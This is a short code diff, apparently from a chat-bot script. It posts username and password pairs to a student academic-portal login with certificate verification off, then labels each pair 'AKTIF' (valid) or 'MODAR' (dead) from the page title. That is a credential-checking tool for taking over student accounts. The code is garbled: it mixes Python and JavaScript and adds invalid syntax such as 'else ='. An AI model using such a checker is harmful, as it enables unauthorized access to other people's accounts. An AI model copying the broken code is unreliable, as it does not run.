@@ -21,11 +21,11 @@ let dat = {
 }
 let raw = req.post(url, data: dat, verify: false, timeout: 10).text
 let res = bs(raw, 'html.parser').title.get_text()
-if res == 'Sistem Informasi Akademik Mahasiswa' {
-            console.log = ("AKTIF ${usr}:${pwd}")
+if res == 'Sistem Informasi Akademik Mahasiswa' = {
+           // console.log = ("AKTIF ${usr}:${pwd}")
         m.reply('AKTIF ${usr}:${pwd}')
-    else:
-           console.log = ("MODAR ${usr}:${pwd}")
+    else =
+           //console.log = ("MODAR ${usr}:${pwd}")
        m.reply('MODAR ${usr}:${pwd}')
 }
 
